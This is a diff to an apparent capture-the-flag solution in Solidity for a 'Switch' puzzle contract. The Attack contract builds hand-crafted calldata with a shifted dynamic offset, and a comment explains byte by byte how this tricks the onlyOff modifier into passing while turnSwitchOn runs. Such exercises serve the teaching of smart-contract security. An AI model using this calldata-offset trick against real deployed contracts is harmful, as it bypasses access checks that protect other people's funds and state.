@@ -40,16 +40,20 @@ contract Switch {
 }
 
 contract Attack {
-    Switch public constant sw = Switch(0x939ddF8aCf36daA37B22E89AFe40B99881EED7a7);
+    Switch public immutable sw;
+
+    constructor() {
+        sw = new Switch();
+    }
 
     function kek() external {
         bytes memory data = abi.encodePacked(
             Switch.flipSwitch.selector,
-            abi.encode(uint256(96)), // ignore 3 slots
+            abi.encode(uint256(68)), // ignore 68 bytes
             abi.encode(uint256(0)), // an empty slot as a placeholder
-            abi.encode(Switch.turnSwitchOff.selector), // the selector to pass `require`
-            abi.encode(uint256(32)), // length to read
-            abi.encode(Switch.turnSwitchOn.selector)
+            Switch.turnSwitchOff.selector, // the selector to pass `require`
+            abi.encode(uint256(4)), // length to read
+            Switch.turnSwitchOn.selector
         );
 
         (bool s,) = address(sw).call(data);
@@ -64,12 +68,12 @@ Selectors:
   turnSwitchOff - 0x20606e15
   flipSwitch -    0x30c13ade
 
-If we want to turn off the switch, we call the Switch contract with this data: 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000
+If we want to turn off the switch, we call the Switch contract with this data: 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002020606e15
 Which is:
   0x30c13ade - flipSwitch selector
   0000000000000000000000000000000000000000000000000000000000000020 - offset (where 0x00..0020 == 32 bytes), which tells how many bytes to skip from the previous selector (here we only skip this slot)
-  0000000000000000000000000000000000000000000000000000000000000020 - length, which tells how many bytes to read next (here we only read the next slot)
-  20606e1500000000000000000000000000000000000000000000000000000000 - turnSwitchOff selector
+  0000000000000000000000000000000000000000000000000000000000000004 - length, which tells how many bytes to read next (here we only read 4 bytes)
+  20606e15 - turnSwitchOff selector
 N.B. Slot is every 32 bytes after the selector.
 
 We can turn off the switch, but we cannot turn it on like this, because if we replace turnSwitchOff selector with turnSwitchOn selector,
@@ -79,11 +83,11 @@ We get selector[0] using calldatacopy(selector, 68, 4), which says that we need 
 
 To turn on the switch we beed to change the calldata:
   0x30c13ade - flipSwitch selector
-  0000000000000000000000000000000000000000000000000000000000000060 - offset, which tells to ignore this and the next 2 slots (0x00..060 == 96 bytes)
+  0000000000000000000000000000000000000000000000000000000000000044 - offset, which tells to ignore 68 bytes == 0x00..044
   0000000000000000000000000000000000000000000000000000000000000000 - an empty slot as a placeholder
-  20606e1500000000000000000000000000000000000000000000000000000000 - turnSwitchOff selector to pass `require` statement
-  0000000000000000000000000000000000000000000000000000000000000020 - length, which tells to read the next slot
-  76227e1200000000000000000000000000000000000000000000000000000000 - turnSwitchOn selector
+  20606e15 - turnSwitchOff selector to pass `require` statement
+  0000000000000000000000000000000000000000000000000000000000000004 - length, which tells to read the next 4 bytes
+  76227e12 - turnSwitchOn selector
 
-Because we changed the offset the contract will call the turnSwitchOn function, but onlyOff modifier will still read from the 3rd slot
+Because we changed the offset the contract will call the turnSwitchOn function, but onlyOff modifier will still read turnSwitchOff selector
 */
